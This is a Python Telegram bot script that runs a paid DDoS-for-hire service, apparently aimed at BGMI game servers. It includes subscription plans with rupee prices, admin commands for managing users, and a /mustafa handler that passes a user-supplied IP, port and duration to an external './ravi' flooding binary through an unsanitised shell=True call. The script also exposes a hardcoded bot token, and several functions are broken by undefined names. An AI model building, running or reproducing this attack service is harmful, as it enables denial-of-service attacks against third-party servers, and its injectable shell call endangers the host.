#script by @SIDIKI_MUSTAFA_47

import telebot
import subprocess
import datetime
import os
# insert your Telegram bot token here
bot = telebot.TeleBot('7615454196:AAG3BqA2vEs4Fu97056-4iwHxTxgspwu7Hw')

# Admin user IDs
admin_id = ["8179218740"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass

# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    admin_id = ["8179218740"]
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found ❌."
            else:
                file.truncate(0)
                response = "Logs cleared successfully ✅"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

import datetime

# Dictionary to store the approval expiry date for each user
user_approval_expiry = {}

# Function to calculate remaining approval time
def get_remaining_approval_time(user_id):
    expiry_date = user_approval_expiry.get(user_id)
    if expiry_date:
        remaining_time = expiry_date - datetime.datetime.now()
        if remaining_time.days < 0:
            return "Expired"
        else:
            return str(remaining_time)
    else:
        return "N/A"

# Function to add or update user approval expiry date
def set_approval_expiry_date(user_id, duration, time_unit):
    current_time = datetime.datetime.now()
    if time_unit == "hour" or time_unit == "hours":
        expiry_date = current_time + datetime.timedelta(hours=duration)
    elif time_unit == "day" or time_unit == "days":
        expiry_date = current_time + datetime.timedelta(days=duration)
    elif time_unit == "week" or time_unit == "weeks":
        expiry_date = current_time + datetime.timedelta(weeks=duration)
    elif time_unit == "month" or time_unit == "months":
        expiry_date = current_time + datetime.timedelta(days=30 * duration)  # Approximation of a month
    else:
        return False
    
    user_approval_expiry[user_id] = expiry_date
    return True

# Command handler for adding a user with approval time
@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 2:
            user_to_add = command[1]
            duration_str = command[2]

            try:
                duration = int(duration_str[:-4])  # Extract the numeric part of the duration
                if duration <= 0:
                    raise ValueError
                time_unit = duration_str[-4:].lower()  # Extract the time unit (e.g., 'hour', 'day', 'week', 'month')
                if time_unit not in ('hour', 'hours', 'day', 'days', 'week', 'weeks', 'month', 'months'):
                    raise ValueError
            except ValueError:
                response = "Invalid duration format. Please provide a positive integer followed by 'hour(s)', 'day(s)', 'week(s)', or 'month(s)'."
                bot.reply_to(message, response)
                return

            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                if set_approval_expiry_date(user_to_add, duration, time_unit):
                    response = f"User {user_to_add} added successfully for {duration} {time_unit}. Access will expire on {user_approval_expiry[user_to_add].strftime('%Y-%m-%d %H:%M:%S')} 👍."
                else:
                    response = "Failed to set approval expiry date. Please try again later."
            else:
                response = "User already exists 🤦‍♂️."
        else:
            response = "Please specify a user ID and the duration (e.g., 1hour, 2days, 3weeks, 4months) to add 😘."
    else:
        response = "Yᴏᴜ Hᴀᴠᴇ Nᴏᴛ Pᴜʀᴄʜᴀsᴇᴅ Yᴇᴛ Pᴜʀᴄʜᴀsᴇ Nᴏᴡ:- @SIDIKI_MUSTAFA_47."

    bot.reply_to(message, response)

# Command handler for retrieving user info
@bot.message_handler(commands=['myinfo'])
def get_user_info(message):
    user_id = str(message.chat.id)
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else "N/A"
    user_role = "Admin" if user_id in admin_id else "User"
    remaining_time = get_remaining_approval_time(user_id)
    response = f"👤 Your Info:\n\n🆔 User ID: <code>{user_id}</code>\n📝 Username: {username}\n🔖 Role: {user_role}\n📅 Approval Expiry Date: {user_approval_expiry.get(user_id, 'Not Approved')}\n⏳ Remaining Approval Time: {remaining_time}"
    bot.reply_to(message, response, parse_mode="HTML")



@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} removed successfully 👍."
            else:
                response = f"User {user_to_remove} not found in the list ❌."
        else:
            response = '''Please Specify A User ID to Remove. 
✅ Usage: /remove <userid>'''
    else:
        response = "You have not purchased yet purchase now from:- @SIDIKI_MUSTAFA_47 🙇."

    bot.reply_to(message, response)

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found ❌."
                else:
                    file.truncate(0)
                    response = "Logs Cleared Successfully ✅"
        except FileNotFoundError:
            response = "Logs are already cleared ❌."
    else:
        response = "You have not purchased yet purchase now from :- @SIDIKI_MUSTAFA_47 ❄."
    bot.reply_to(message, response)


@bot.message_handler(commands=['clearusers'])
def clear_users_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "USERS are already cleared. No data found ❌."
                else:
                    file.truncate(0)
                    response = "users Cleared Successfully ✅"
        except FileNotFoundError:
            response = "users are already cleared ❌."
    else:
        response = "Fʀᴇᴇ Kᴇ Dʜᴀʀᴍ Sʜᴀʟᴀ Hᴀɪ Yᴀ Jᴏ Mᴜ Uᴛᴛʜᴀ Kᴀɪ Kʜɪ Bʜɪ Gᴜꜱ Rʜᴀɪ Hᴏ Bᴜʏ Kʀᴏ Fʀᴇᴇ Mᴀɪ Kᴜᴄʜ Nʜɪ Mɪʟᴛᴀ Bᴜʏ:- @SIDIKI_MUSTAFA_47 🙇."
    bot.reply_to(message, response)
 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "Nᴏ Dᴀᴛᴀ Fᴏᴜɴᴅ ❌"
        except FileNotFoundError:
            response = "Nᴏ Dᴀᴛᴀ Fᴏᴜɴᴅ ❌"
    else:
        response = "Fʀᴇᴇ Kᴇ Dʜᴀʀᴍ Sʜᴀʟᴀ Hᴀɪ Yᴀ Jᴏ Mᴜ Uᴛᴛʜᴀ Kᴀɪ Kʜɪ Bʜɪ Gᴜꜱ Rʜᴀɪ Hᴏ Bᴜʏ Kʀᴏ Fʀᴇᴇ Mᴀɪ Kᴜᴄʜ Nʜɪ Mɪʟᴛᴀ Bᴜʏ:- @SIDIKI_MUSTAFA_47 ❄."
    bot.reply_to(message, response)

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "Nᴏ Dᴀᴛᴀ Fᴏᴜɴᴅ❌."
                bot.reply_to(message, response)
        else:
            response = "Nᴏ Dᴀᴛᴀ Fᴏᴜɴᴅ ❌"
            bot.reply_to(message, response)
    else:
        response = "Fʀᴇᴇ Kᴇ Dʜᴀʀᴍ Sʜᴀʟᴀ Hᴀɪ Yᴀ Jᴏ Mᴜ Uᴛᴛʜᴀ Kᴀɪ Kʜɪ Bʜɪ Gᴜꜱ Rʜᴀɪ Hᴏ Bᴜʏ Kʀᴏ Fʀᴇᴇ Mᴀɪ Kᴜᴄʜ Nʜɪ Mɪʟᴛᴀ Bᴜʏ:- @SIDIKI_MUSTAFA_47 ❄."
        bot.reply_to(message, response)


# Function to handle the reply when free users run the /mustafa command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: VIP- User of @SIDIKI_MUSTAFA_47"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /mustafa command
bgmi_cooldown = {}

COOLDOWN_TIME =0

# Handler for /mustafa command
@bot.message_handler(commands=['mustafa'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
                response = "Yᴏᴜ Aʀᴇ Oɴ Cᴏᴏʟᴅᴏᴡɴ ❌. Pʟᴇᴀsᴇ Wᴀɪᴛ 10sᴇᴄ Bᴇғᴏʀᴇ Rᴜɴɴɪɴɢ Tʜᴇ  /mustafa Cᴏᴍᴍᴀɴᴅ Aɢᴀɪɴ."
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert port to integer
            time = int(command[3])  # Convert time to integer
            if time > 180:
                response = "Error: Time interval must be less than 180."
            else:
                record_command_logs(user_id, '/mustafa', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./ravi {target} {port} {time} 1200"
                process = subprocess.run(full_command, shell=True)
                response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
                bot.reply_to(message, response)  # Notify the user that the attack is finished
        else:
            response = "𝐃𝐄𝐀𝐑 𝐔𝐒𝐄𝐑. 🧨\n\n𝐔𝐒𝐀𝐆𝐄 /mustafa < 𝐈𝐏 > < 𝐏𝐎𝐑𝐓 > < 𝐓𝐈𝐌𝐄 >\n\n𝙁𝙊𝙍 𝙀𝙓𝘼𝙈𝙋𝙇𝙀 :-> /mustafa 20.0.0.0 10283 100\n\n𝘿𝙊𝙉'𝙏 𝙎𝙋𝘼𝙈 ⚠️‼️\nᴛʜɪs ʙᴏᴛ ᴏᴡɴᴇʀ ❤️‍🩹:--> @SIDIKI_MUSTAFA_47"  # Updated command syntax
    else:
        response = ("🚫 ᴜɴᴀᴜᴛʜᴏʀɪᴢᴇᴅ ᴀᴄᴄᴇꜱꜱ! 🚫\n\nᴏᴏᴘꜱ! ɪᴛ ꜱᴇᴇᴍꜱ ʟɪᴋᴇ ʏᴏᴜ ᴅᴏɴ'ᴛ ʜᴀᴠᴇ ᴘᴇʀᴍɪꜱꜱɪᴏɴ ᴛᴏ ᴜꜱᴇ ᴛʜᴇ /mustafa ᴄᴏᴍᴍᴀɴᴅ. ᴛᴏ ɢᴀɪɴ ᴀᴄᴄᴇꜱꜱ ᴀɴᴅ ᴜɴʟᴇᴀꜱʜ ᴛʜᴇ ᴘᴏᴡᴇʀ ᴏꜰ ᴀᴛᴛᴀᴄᴋꜱ, ʏᴏᴜ ᴄᴀɴ:\n\n👉 ᴄᴏɴᴛᴀᴄᴛ ᴀɴ ᴀᴅᴍɪɴ ᴏʀ ᴛʜᴇ ᴏᴡɴᴇʀ ꜰᴏʀ ᴀᴘᴘʀᴏᴠᴀʟ.\n🌟 ʙᴇᴄᴏᴍᴇ ᴀ ᴘʀᴏᴜᴅ ꜱᴜᴘᴘᴏʀᴛᴇʀ ᴀɴᴅ ᴘᴜʀᴄʜᴀꜱᴇ ᴀᴘᴘʀᴏᴠᴀʟ.\n💬 ᴄʜᴀᴛ ᴡɪᴛʜ ᴀɴ ᴀᴅᴍɪɴ ɴᴏᴡ ᴀɴᴅ ʟᴇᴠᴇʟ ᴜᴘ ʏᴏᴜʀ ᴄᴀᴘᴀʙɪʟɪᴛɪᴇꜱ\n\n🚀 ʀᴇᴀᴅʏ ᴛᴏ ꜱᴜᴘᴇʀᴄʜᴀʀɢᴇ ʏᴏᴜʀ ᴇxᴘᴇʀɪᴇɴᴄᴇ? ᴛᴀᴋᴇ ᴀᴄᴛɪᴏɴ ᴀɴᴅ ɢᴇᴛ ʀᴇᴀᴅʏ ꜰᴏʀ ᴘᴏᴡᴇʀꜰᴜʟ ᴀᴛᴛᴀᴄᴋꜱ!\n\n𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘 @SIDIKI_MUSTAFA_47")

    bot.reply_to(message, response)


# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "❌ Nᴏ Cᴏᴍᴍᴀɴᴅ Lᴏɢs Fᴏᴜɴᴅ Fᴏʀ Yᴏᴜ ❌."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "Yᴏᴜ Aʀᴇ Nᴏᴛ Aᴜᴛʜᴏʀɪᴢᴇᴅ Tᴏ Usᴇ Tʜɪs Cᴏᴍᴍᴀɴᴅ 😡."

    bot.reply_to(message, response)

@bot.message_handler(commands=['help'])
def show_help(message):
    help_text ='''🤖 Aᴠᴀɪʟᴀʙʟᴇ Cᴏᴍᴍᴀɴᴅs:
💥 /mustafa : Mᴇᴛʜᴏᴅ Fᴏʀ Bɢᴍɪ Sᴇʀᴠᴇʀ. 
💥 /rules : Pʟᴇᴀsᴇ Cʜᴇᴄᴋ Bᴇғᴏʀᴇ Usᴇ !!.
💥 /mylogs : Tᴏ Cʜᴇᴄᴋ Oᴜʀ Rᴇᴄᴇɴᴛ Aᴛᴛᴀᴄᴋs.
💥 /plan : Cʜᴇᴄᴋ Oᴜᴛ Oᴜʀ Bᴏʀɴᴇᴛ Rᴀᴛᴇs.
💥 /myinfo : Tᴏ Cʜᴇᴄᴋ Yᴏᴜʀ Wʜᴏʟᴇ Iɴғᴏ.

🤖 To See Admin Commands:
💥 /admincmd : Sʜᴏᴡ Aʟʟ Aᴅᴍɪɴ Cᴏᴍᴍᴀɴᴅs.

Buy From :-@SIDIKI_MUSTAFA_47
Official Channel :- https://t.me/+aTykrekd1YJlNDc1
'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f"""
👋🏻 𝗪𝗘𝗟𝗖𝗢𝗠𝗘, {username} 💀! 🔥
━━━━━━━━━━━━━━━━━━━━━
🤖 𝗧𝗛𝗜𝗦 𝗜𝗦 𝗠𝗨𝗦𝗧𝗔𝗙𝗔 𝗕𝗢𝗧!
🚀 𝗘𝗻𝗷𝗼𝘆 𝗵𝗶𝗴𝗵-𝘀𝗽𝗲𝗲𝗱 𝗮𝘁𝘁𝗮𝗰𝗸𝘀!

📢 𝗝𝗼𝗶𝗻 𝗢𝘂𝗿 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 𝗖𝗵𝗮𝗻𝗻𝗲𝗹:
━━━━━━━━━━━━━━━━━━━━━
📌 𝗧𝗿𝘆 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱:
/mustafa - 🚀 Start an attack!

👑 𝗕𝗢𝗧 𝗖𝗥𝗘𝗔𝗧𝗘𝗗 𝗕𝗬: @SIDIKI_MUSTAFA_47 💀?🏻 𝗪𝗘𝗟𝗖𝗢𝗠𝗘, {username} 💀! 🔥
━━━━━━━━━━━━━━━━━━━━━
🤖 𝗧𝗛𝗜𝗦 𝗜𝗦 𝗠𝗨𝗦𝗧𝗔𝗙𝗔 𝗕𝗢𝗧!
🚀 𝗘𝗻𝗷𝗼𝘆 𝗵𝗶𝗴𝗵-𝘀𝗽𝗲𝗲𝗱 𝗮𝘁𝘁𝗮𝗰𝗸𝘀!

📢 𝗝𝗼𝗶𝗻 𝗢𝘂𝗿 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 𝗖𝗵𝗮𝗻𝗻𝗲𝗹:
━━━━━━━━━━━━━━━━━━━━━
📌 𝗧𝗿𝘆 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱:
/mustafa - 🚀 Start an attack!

👑 𝗕𝗢𝗧 𝗖𝗥𝗘𝗔𝗧𝗘𝗗 𝗕𝗬: @SIDIKI_MUSTAFA_47 💀
"""

    keyboard = [
        [InlineKeyboardButton("📢 CLICK HERE TO JOIN", url="https://t.me/MUSTAFALEAKS2")],
        [InlineKeyboardButton("👑 BOT CREATED BY ??", url="https://t.me/SIDIKI_MUSTAFA_47")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    update.message.reply_text(message, reply_markup=reply_markup)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} Please Follow These Rules ⚠️:

1. Dont Run Too Many Attacks !! Cause A Ban From Bot
2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot.
3. MAKE SURE YOU JOINED https://t.me/+aTykrekd1YJlNDc1 OTHERWISE NOT WORK
4. We Daily Checks The Logs So Follow these rules to avoid Ban!!'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!:

Vip 🌟 :
-> Attack Time : 180 (S)
> After Attack Limit : 10 sec
-> Concurrents Attack : 5

Pr-ice List💸 :
Day-->60 Rs
Week-->420 Rs
Month-->800 Rs
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Admin Commands Are Here!!:

💥 /add <userId> : Aᴅᴅ A Usᴇʀ.
💥 /remove <userid> Rᴇᴍᴏᴠᴇ A Usᴇʀ.
💥 /allusers : Aᴜᴛʜᴏʀɪᴢᴇᴅ Usᴇʀs Lɪsᴛ.
💥 /logs : Aʟʟ Usᴇʀ Lᴏɢs.
💥 /broadcast : Bʀᴏᴀᴅᴄᴀsᴛ A Mᴇssᴀɢᴇ.
💥 /clearlogs : Cʟᴇᴀʀ Tʜᴇ Lᴏɢs Fɪʟᴇ.
💥 /clearusers : Cʟᴇᴀʀ Tʜᴇ Usᴇʀs Fɪʟᴇ.
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "⚠️ Message To All Users By Admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users 👍."
        else:
            response = "🤖 Please Provide A Message To Broadcast."
    else:
        response = "Oɴʟʏ Aᴅᴍɪɴ Cᴀɴ Rᴜɴ Tʜɪs Cᴏᴍᴍᴀɴᴅ😡."

    bot.reply_to(message, response)



#bot.polling()
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)























